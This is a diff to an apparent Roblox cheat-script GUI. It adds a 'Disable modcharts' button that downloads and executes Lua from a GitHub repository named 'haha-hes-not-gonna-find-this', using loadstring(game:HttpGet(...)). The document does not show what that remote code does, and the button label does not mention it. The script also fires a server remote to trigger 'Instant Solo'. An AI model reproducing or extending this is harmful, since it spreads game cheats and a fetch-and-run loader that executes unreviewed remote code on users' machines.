@@ -47,6 +47,14 @@ Window:AddButton{text="Unload script",callback=function()
     script:Destroy()
 end}
 
+FolderMain:AddButton{text="Disable modcharts",callback=function()
+    loadstring(game:HttpGet'https://raw.githubusercontent.com/Mati278/haha-hes-not-gonna-find-this/main/thing.lua')()
+    game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Note";
+        Text = "You need to rejoin to re-enable modcharts";
+        Icon = "rbxthumb://type=Asset&id=8370951801&w=420&h=420"})
+end} 
+
 Window:AddButton{text="Instant Solo",callback=function()
     Client.PlayerGui:WaitForChild'SingleplayerUI'.ButtonPressed:FireServer()
 end}
